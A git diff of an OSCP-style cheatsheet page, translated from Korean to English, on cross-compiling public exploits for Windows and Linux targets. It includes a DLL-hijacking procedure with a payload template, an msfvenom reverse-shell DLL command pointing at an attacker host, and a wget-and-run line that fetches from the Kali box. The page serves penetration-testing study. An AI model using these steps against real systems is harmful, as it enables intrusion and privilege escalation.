@@ -1,26 +1,26 @@
 ---
-title: "크로스 컴파일 (Cross-Compiling)"
+title: "Cross-Compiling"
 date: 2026-06-20
 weight: 160
 draft: false
 tags: ["oscp", "cheatsheet"]
-summary: "대상에서 컴파일이 안 될 때, Kali에서 먼저 테스트해야 할 때의 Windows/Linux 대처법."
+summary: "What to do for Windows and Linux when the target cannot compile, or when you should test on Kali first."
 ---
 
-대상이 컴파일을 못 할 때, Kali에서 먼저 테스트해야 할 때, GLIBC가 발목을 잡을 때의 대처 모음. Windows(mingw + wine)와 Linux(docker + static)를 모두 다룬다.
+What to do when the target cannot compile, when you should test on Kali first, and when GLIBC gets in the way. Covers both Windows (mingw + wine) and Linux (docker + static).
 
-- 출처: https://heretek.dev/oscp-cheatsheet/cross-compiling/ (Jean Romero) — 재구성
-- 변수: `$TARGET` = 공격 대상, `$KALI` = 공격자(Kali) IP
+- Source: https://heretek.dev/oscp-cheatsheet/cross-compiling/ (Jean Romero) — Reconstructed
+- Variables: `$TARGET` = target host, `$KALI` = attacker Kali IP
 
-## 1. 이 문서를 쓰는 시점 (WHEN to use)
+## 1. When to use this document
 
-- 공개 익스플로잇이 .c인데 대상은 Windows, EXE가 필요 → §3
-- 공개 익스플로잇이 .c인데 대상은 Linux, gcc가 없음 → §5
-- 컴파일한 바이너리가 Kali에서는 되는데 대상에서 실패 → §6 + §7
-- 대상에서 GLIBC_X.Y not found → §5 (버전 일치 컨테이너)
-- 업로드 대신 Kali에서 원격 익스플로잇을 직접 발사 → §6 (wine)
+- The public exploit is .c but the target is Windows and you need an EXE → §3
+- The public exploit is .c but the target is Linux and has no gcc → §5
+- The compiled binary works on Kali but fails on the target → §6 + §7
+- GLIBC_X.Y not found on the target → §5 (version-matched container)
+- Launch the remote exploit directly from Kali instead of uploading → §6 (wine)
 
-## 2. 셋업 (Kali에서 1회)
+## 2. Setup (once on Kali)
 
 ```bash
 # Windows cross-compile
@@ -34,14 +34,14 @@ sudo apt install wine wine32 wine64
 sudo apt install docker.io && sudo systemctl start docker
 ```
 
-mingw 컴파일러는 두 종류 — 아키텍처가 대상과 일치해야 한다 (중요):
+Two kinds of mingw compilers — the architecture must match the target (important):
 
-- `i686-w64-mingw32-gcc` — 32비트 Windows PE
-- `x86_64-w64-mingw32-gcc` — 64비트 Windows PE (요즘 기본)
+- `i686-w64-mingw32-gcc` — 32-bit Windows PE
+- `x86_64-w64-mingw32-gcc` — 64-bit Windows PE (the usual default today)
 
-`file evil.exe` 로 확인 — `PE32` = 32비트, `PE32+` = 64비트. 어긋나면 조용히 실패한다.
+Check with `file evil.exe` — `PE32` = 32-bit, `PE32+` = 64-bit. A mismatch fails silently.
 
-## 3. C 소스에서 Windows EXE 만들기
+## 3. Building a Windows EXE from C source
 
 ```bash
 # Basic
@@ -54,23 +54,23 @@ i686-w64-mingw32-gcc exploit.c -o exploit.exe -lws2_32
 x86_64-w64-mingw32-gcc -static -o exploit.exe exploit.c -lws2_32
 ```
 
-링커 에러 규칙: `undefined reference to _imp__<symbol>` → 심볼을 검색 → 일치하는 `-l` 플래그 추가.
+Linker error rule: `undefined reference to _imp__<symbol>` → look up the symbol → add the matching `-l` flag.
 
-심볼별 플래그:
+Flags per symbol:
 
 - `WSAStartup`, `socket`, `connect`, `send` → `-lws2_32` (winsock)
 - `InternetOpen`, `HttpSend` → `-lwininet` (HTTP)
-- `RegOpenKey`, `OpenSCManager` → `-ladvapi32` (레지스트리 / 서비스)
+- `RegOpenKey`, `OpenSCManager` → `-ladvapi32` (registry / services)
 
-## 4. DLL 하이재킹용 Windows DLL
+## 4. Windows DLL for DLL hijacking
 
-같은 컴파일러에 `--shared`와 `.dll` 확장자를 쓴다. 파일 이름은 대상 앱이 로드하는 DLL과 정확히 일치해야 한다 (필수).
+Use the same compiler with `--shared` and the `.dll` extension. The filename must exactly match the DLL the target app loads (required).
 
 ```bash
 x86_64-w64-mingw32-gcc evil.cpp --shared -o TextShaping.dll
 ```
 
-DllMain 템플릿 — 페이로드는 `DLL_PROCESS_ATTACH`에서 실행된다:
+DllMain template — the payload runs on `DLL_PROCESS_ATTACH`:
 
 ```text
 #include <stdlib.h>
@@ -91,35 +91,35 @@ BOOL APIENTRY DllMain(HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserve
 }
 ```
 
-역방향 쉘만 필요하면 msfvenom이 더 빠르다:
+If you only need a reverse shell, msfvenom is faster:
 
 ```bash
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=443 -f dll -o evil.dll
 ```
 
-DLL 하이재킹 절차:
+DLL hijacking procedure:
 
-1. `icacls "C:\App"` 으로 내 계정에 `(M)` 또는 `(F)` 가 있는지 확인
-2. 대상 DLL 이름을 특정 (로컬 사본에서 procmon, 또는 알려진 CVE)
-3. 쓰기 가능한 디렉터에 대상 DLL과 정확히 같은 이름으로 내 DLL을 떨어뜨린다 (정확한 파일명 필수)
-4. 권한 있는 유저가 앱을 실행하기를 기다린다 — DLL이 그 유저의 권한으로 로드된다
+1. Check whether your account has `(M)` or `(F)` with `icacls "C:\App"`
+2. Identify the target DLL name (procmon on a local copy, or a known CVE)
+3. Drop your DLL into the writable directory with exactly the same name as the target DLL (exact filename required)
+4. Wait for a privileged user to launch the app — the DLL loads with that user's privileges
 
-## 5. Linux ELF — 대상에 gcc가 없을 때
+## 5. Linux ELF — when the target has no gcc
 
-진짜 문제는 "gcc 없음"이 아니라 glibc 불일치인 경우가 대부분 (중요). Kali(최신 glibc)에서 컴파일하면 오래된 대상에서 `GLIBC_2.34 not found` 로 실패한다.
+The real problem is usually not "no gcc" but a glibc mismatch (important). Compiling on Kali (latest glibc) fails on an older target with `GLIBC_2.34 not found`.
 
-### 전략 A — 정적 링크 먼저 (빠르고 자주 통한다)
+### Strategy A — Static linking first (fast and often works)
 
 ```bash
 gcc -static -o exploit exploit.c
 file exploit         # should say "statically linked"
 ```
 
-정적 바이너리는 대상 glibc에 의존하지 않는다. 파일이 크지만 아키텍처만 맞으면 어디서든 돈다.
+A static binary does not depend on the target glibc. The file is larger, but it runs anywhere the architecture matches.
 
-정적 링크가 안 되는 경우: 동적 로더 동작에 의존하는 익스플로잇 (PwnKit은 정적 컴파일이 안 된다), dlopen/dlsym을 쓰는 익스플로잇.
+When static linking does not work: exploits that depend on dynamic loader behavior (PwnKit cannot be compiled statically), and exploits that use dlopen/dlsym.
 
-### 전략 B — 대상 배포판과 맞는 Docker 컨테이너
+### Strategy B — Docker container matching the target distro
 
 ```bash
 # Identify target first
@@ -143,7 +143,7 @@ python3 -m http.server 8000
 wget http://KALI_IP:8000/exploit && chmod +x exploit && ./exploit
 ```
 
-대상 배포판 → 컨테이너:
+Target distro → container:
 
 - Ubuntu 16.04 / 18.04 / 20.04 → `ubuntu:16.04` / `:18.04` / `:20.04`
 - Debian 9 / 10 / 11 → `debian:9` / `:10` / `:11`
@@ -151,39 +151,39 @@ wget http://KALI_IP:8000/exploit && chmod +x exploit && ./exploit
 - RHEL/CentOS 8 → `rockylinux:8`
 - Alpine → `alpine:3.X`
 
-## 6. 전송 전 테스트
+## 6. Testing before transfer
 
-### 아키텍처 확인 — 항상 수행
+### Check the architecture — always
 
 ```bash
 file evil.exe     # PE32 or PE32+ — must match target arch
 file exploit      # ELF 32-bit or 64-bit — must match target arch
 ```
 
-### Wine — Windows 바이너리를 Kali에서 스모크 테스트
+### Wine — smoke-test Windows binaries on Kali
 
 ```bash
 wine evil.exe                 # smoke test
 sudo wine exploit.exe         # if raw socket privileges needed
 ```
 
-실제 쓰임은 두 가지:
+Two real uses:
 
-1. 스모크 테스트 — wine에서 크래시하면 망가진 것이다. 전송해도 안 될 바이너리에 대상 리셋을 낭비하지 않는다.
-2. 원격 네트워크 익스플로잇을 Kali에서 직접 실행 — 컴파일된 익스플로잇 다수가 소켓을 열어 대상 IP를 향해 쏜다. Windows에 업로드할 필요가 없다.
+1. Smoke test — if it crashes in wine, it is broken. Do not waste a target reset on a binary that will not work anyway.
+2. Run remote network exploits directly from Kali — many compiled exploits open a socket and fire at the target IP. No need to upload to Windows.
 
-Wine이 되는 것: 네트워크 익스플로잇, 간단한 유틸리티, BoF 스텁, 기본 system() 호출.
-Wine이 안 되는 것: SeImpersonate Potato 공격, 실제 Windows 서비스 / .NET / WMI / SCM이 필요한 것, GUI 앱. 이런 것은 실제 대상으로 전송한다.
+What works in wine: network exploits, simple utilities, BoF stubs, basic system() calls.
+What does not work in wine: SeImpersonate Potato attacks, anything needing real Windows services / .NET / WMI / SCM, GUI apps. Transfer those to the real target.
 
-## 7. 문제 해결 (Troubleshooting)
+## 7. Troubleshooting
 
-증상 / 원인 / 해결 순:
+Symptom / cause / fix, in order:
 
-- `undefined reference to _imp__WSAStartup` → winsock 링크 누락 → `-lws2_32` 추가
-- Kali(wine)에서는 되는데 대상에서 안 됨 → 대상에 런타임 DLL 없음 → `-static` 으로 재빌드
-- 대상에서 GLIBC_2.XX not found → glibc 불일치 → 일치하는 docker 컨테이너에서 빌드, 또는 `-static`
-- DLL을 전송했는데 앱이 무시 → 아키텍처 또는 파일명 불일치 → `file evil.dll` 로 아키텍처 확인, 정확한 대상 DLL 이름 확인
-- DLL을 로드하지 않고 앱이 크래시 → DllMain이 잘못됨 → 끝의 `return TRUE;` 확인
-- 하이재크 발동을 위해 서비스 재시작이 안 됨 → `sc stop`/`sc start` 불가 → SeShutdownPrivilege 가 있으면 `shutdown /r /t 0`, 없으면 자동 재시작 또는 예약 트리거 대기
-- `wine: cannot find L"..."` → 32비트 의존성 누락 → `sudo apt install wine32`
-- 컴파일했는데 바이너리가 0바이트 / 손상 → 컴파일러가 조용히 실패 → `-v` 로 재실행해 에러 확인
+- `undefined reference to _imp__WSAStartup` → missing winsock link → add `-lws2_32`
+- Works on Kali (wine) but not on the target → missing runtime DLL on target → rebuild with `-static`
+- GLIBC_2.XX not found on target → glibc mismatch → build in a matching docker container, or use `-static`
+- DLL transferred but the app ignores it → architecture or filename mismatch → check the architecture with `file evil.dll`, confirm the exact target DLL name
+- App crashes without loading the DLL → broken DllMain → check the `return TRUE;` at the end
+- Service restart to trigger the hijack is not possible → `sc stop`/`sc start` unavailable → with SeShutdownPrivilege use `shutdown /r /t 0`, otherwise wait for automatic restart or a scheduled trigger
+- `wine: cannot find L"..."` → missing 32-bit dependencies → `sudo apt install wine32`
+- Compiled binary is 0 bytes / corrupt → compiler failed silently → rerun with `-v` to see the error
